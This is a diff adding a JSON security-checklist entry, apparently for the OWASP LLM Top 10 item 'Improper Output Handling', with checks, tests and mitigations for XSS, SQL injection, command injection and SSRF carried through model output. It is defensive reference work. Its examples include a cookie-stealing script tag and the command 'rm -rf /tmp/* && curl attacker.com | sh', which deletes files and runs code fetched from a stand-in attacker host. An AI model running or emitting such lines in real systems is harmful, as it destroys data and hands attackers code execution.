@@ -1,0 +1,57 @@
+{
+  "id": "LLM05",
+  "name": "Improper Output Handling",
+  "what_it_means": "LLM-generated output is passed to downstream components (browsers, databases, shells, APIs) without sanitization, enabling XSS, SQL injection, code execution, or SSRF via AI-generated content.",
+  "animated_example": "Like a secretary reading an instruction letter aloud on the intercom without checking if it secretly tells maintenance to unlock the vault.",
+  "quick_checks": [
+    "Is LLM output sanitized (HTML-escaped, parameterized) before rendering in a browser or inserting into a database?",
+    "Is LLM-generated code executed in a sandbox with no network or filesystem access?",
+    "Are structured outputs validated against a strict schema before use in downstream systems?",
+    "Are LLM-generated URLs or commands blocked from direct execution without human review?"
+  ],
+  "payload_types": [
+    {
+      "type": "XSS via LLM Output",
+      "description": "LLM generates HTML/JavaScript that is rendered unsanitized in a browser",
+      "examples": ["LLM responds with <script>alert(document.cookie)</script>", "Markdown-rendered response with embedded event handlers", "LLM generates a link with javascript: URI"],
+      "mitigation": ["HTML-encode all LLM output before rendering", "Apply Content-Security-Policy to block inline scripts"]
+    },
+    {
+      "type": "SQL Injection via LLM Output",
+      "description": "LLM-generated SQL queries or data used directly in database calls",
+      "examples": ["LLM constructs a query: SELECT * FROM users WHERE id='user_input'--", "LLM-generated filter string inserted directly into ORM query", "Dynamic SQL built from LLM natural language output"],
+      "mitigation": ["Never concatenate LLM output directly into SQL", "Use parameterized queries for all database operations"]
+    },
+    {
+      "type": "Command Injection via LLM Output",
+      "description": "LLM-generated shell commands or code executed without sandboxing",
+      "examples": ["LLM suggests: rm -rf /tmp/* && curl attacker.com | sh", "Code interpreter executes LLM-written code with system access", "LLM-generated config files with embedded shell commands"],
+      "mitigation": ["Execute LLM-generated code in isolated sandboxes with no network/filesystem access", "Require human review before executing any LLM-generated commands"]
+    },
+    {
+      "type": "SSRF via LLM-Generated URLs",
+      "description": "LLM generates URLs that are fetched by the server without validation",
+      "examples": ["LLM generates fetch URL pointing to internal metadata service", "LLM-crafted redirect chain targeting internal resources", "LLM output used as webhook URL without allowlist check"],
+      "mitigation": ["Validate all LLM-generated URLs against an allowlist before fetching", "Block RFC1918 and metadata IP ranges for server-initiated requests"]
+    }
+  ],
+  "how_to_test": [
+    "Prompt the LLM to generate XSS payloads and check if they are rendered or escaped in the UI",
+    "Test whether LLM-generated SQL fragments are concatenated into live queries",
+    "Verify code interpreter sandbox: attempt file system access, network calls, or process spawning from LLM-generated code",
+    "Submit prompts that lead the LLM to generate internal IP URLs and verify these are blocked before fetching",
+    "Check if LLM output passes through output encoding before insertion into HTML, JSON, or SQL contexts"
+  ],
+  "expected_outcomes": [
+    "All LLM output is encoded/escaped before rendering in any downstream context",
+    "LLM-generated code executes in a sandboxed environment with no escape paths",
+    "No XSS, SQLi, or command injection reachable through LLM-generated content"
+  ],
+  "minimal_example": "LLM response contains <script>... → output encoder converts to &lt;script&gt;... → browser renders as text, not code",
+  "mitigation": [
+    "Apply context-aware output encoding to all LLM-generated content before rendering — HTML-encode for browser contexts, parameterize for database contexts, and shell-escape for command execution contexts",
+    "Execute all LLM-generated code in isolated sandbox environments (containers, VMs) with no network access, no filesystem write access, and strict resource limits — never execute AI-generated code in the application's own runtime",
+    "Validate LLM-structured outputs (JSON, SQL, XML) against strict schemas before passing to downstream systems — reject any output that deviates from the expected format or type",
+    "Block server-side fetching of LLM-generated URLs unless they pass an allowlist check; enforce RFC1918 and metadata endpoint blocking to prevent SSRF via AI-generated content"
+  ]
+}
